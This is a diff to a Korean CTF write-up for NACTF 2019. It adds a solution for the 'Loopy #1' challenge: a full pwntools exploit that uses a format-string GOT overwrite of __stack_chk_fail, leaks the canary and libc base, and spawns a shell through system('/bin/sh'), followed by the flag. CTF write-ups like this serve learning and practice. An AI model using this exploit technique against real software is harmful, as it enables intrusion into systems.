@@ -5,9 +5,9 @@ with team `༼ つ ◕_◕ ༽つ 뀨` (43/1335)
 [Vyom's Soggy Croutons](#Vyom-s-Soggy-Croutons)  
 [Loony Tunes](#Loony-Tunes)  
 [Super Duper AES](#Super-Duper-AES)  
-[Dr.J's Group Test Randomizer:Board Problem #0](#Dr-J-s-Group-Test-Randomizer:Board-Problem0)  
-[Dr.J's Group Test Randomizer:Board Problem #1](#Dr-J-s-Group-Test-Randomizer:Board-Problem-1)  
-[Dr.J's Group Test Randomizer:BBOB #2](#Dr-J-s-Group-Test-Randomizer:BBOB-2)  
+[Dr.J's Group Test Randomizer:Board Problem #0](#Dr-J-s-Group-Test-Randomizer-Board-Problem-0)  
+[Dr.J's Group Test Randomizer:Board Problem #1](#Dr-J-s-Group-Test-Randomizer-Board-Problem-1)  
+[Dr.J's Group Test Randomizer:BBOB #2](#Dr-J-s-Group-Test-Randomizer-BBOB-2)  
 [Reversible Sneaky Algorithm #0](#Reversible-Sneaky-Algorithm-0)  
 [Reversible Sneaky Algorithm #1](#Reversible-Sneaky-Algorithm-1)  
 [Reversible Sneaky Algorithm #2](#Reversible-Sneaky-Algorithm-2)  
@@ -799,8 +799,60 @@ Same program as Loopy #0, but someone's turned on the stack protector now!
 
 Connect at nc shell.2019.nactf.com 31732
 ```
+## analysis
+무척 삽질했던 문제다. NX에 카나리가 걸려있어서 카나리를 알아내보려 했지만 카나리를 알아내도 프로그램이 종료되면서 무의미해져버렸다. `FSB`를 이용해서 `__stack_chk_fail()` 함수에 `got overwrite`를 해서 카나리가 틀렸을 때, 원하는 곳으로 분기하도록 했다. 내 경우에는 `main`으로 분기해서 카나리를 유지한채 다시 입력을 받을 수 있게 했다.
+``` python
+from pwn import *
 
+#context.log_level = "debug"
 
+e = ELF("./loopy-1")
+lib = ELF("../libc.so.6")
+#lib = e.libc
+
+x = remote("shell.2019.nactf.com", 31732)
+#x = process("./loopy-1")
+pause()
+main = hex(e.symbols['main'])[2:]
+main1 = int("0" + main[:3], 16)
+main2 = int(main[3:], 16)
+
+log.info(main)
+
+# === plt overwrite __stack_chk_fail to main  ===
+payload = "%{}c%15$hn%{}c%14$hn000".format(main1, main2 - main1)
+payload += p32(e.got['__stack_chk_fail'])
+payload += p32(e.got['__stack_chk_fail']+2)
+payload += "a"*(0x4c-len(payload)+4)
+x.sendlineafter("Type something>",payload)
+
+# === Memory leak for libcbase, canary ===
+payload = "%71$x %31$x "
+payload += "a"*(0x4c-len(payload)+4)
+x.sendlineafter("Type something>",payload)
+x.recvuntil("typed: ")
+res = x.recv(20).split(" ")[:-1]
+canary = int(res[1], 16)
+libcbase = int(res[0], 16) - 241 - lib.symbols['__libc_start_main'] 
+
+log.info("canary : " +hex(canary))
+log.info("libcbase : "+hex(libcbase))
+
+# === system("/bin/sh") ===
+print("!!! attack!!!")
+payload = "a"*(64)
+payload += p32(canary)
+payload += "a"*12
+payload += p32(libcbase + lib.symbols['system']) # system()
+payload += "Aaaa"
+payload += p32(libcbase + next(lib.search("/bin/sh"))) #binsh
+x.sendlineafter("Type something>",payload)
+
+x.interactive()
+```
+두번째 입력에서는 `__libc_start_main`의 주소를 leak해서 `libcbase`를 구했고, 동시에 카나리 값도 구했다. main이 중첩되다 보니까 스택 프레임이 약간 꼬여보여서 위치를 찾기 어려웠다. 이후 세번째 입력에서 쉘을 띄울 수 있었다.
+## flag
+`nactf{lo0p_4r0und_th3_G0T_VASfJ4VJ}`
 
 
 
